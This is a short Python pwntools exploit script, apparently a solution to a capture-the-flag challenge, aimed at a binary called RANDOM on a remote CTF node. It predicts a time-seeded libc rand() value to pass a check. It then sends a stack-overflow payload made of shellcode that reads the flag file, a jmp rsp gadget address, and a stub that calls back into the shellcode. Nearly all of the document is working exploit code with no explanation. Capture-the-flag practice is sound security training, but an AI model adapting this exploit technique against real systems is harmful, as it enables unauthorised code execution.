from pwn import *
from ctypes import *

context(os="linux", arch="amd64")
io = process("./RANDOM")
io = remote("node5.anna.nssctf.cn", 26018)

cFunc = cdll.LoadLibrary("/usr/lib/libc.so.6")
cFunc.srand(cFunc.time(0))

elf = ELF("./RANDOM")
jmp_rsp = 0x40094E

v6 = cFunc.rand() % 50

io.recvuntil(b"num:")
io.sendline(str(v6).encode())

#gdb.attach(io)
shellcode = asm(shellcraft.cat("flag")).ljust(0x20 + 0x8, b"\x00")
payload = shellcode + p64(jmp_rsp) + asm("sub rsp,0x30;call rsp")
print(hex(len(payload)))
io.recvuntil(b"door")
io.send(payload)


io.interactive()
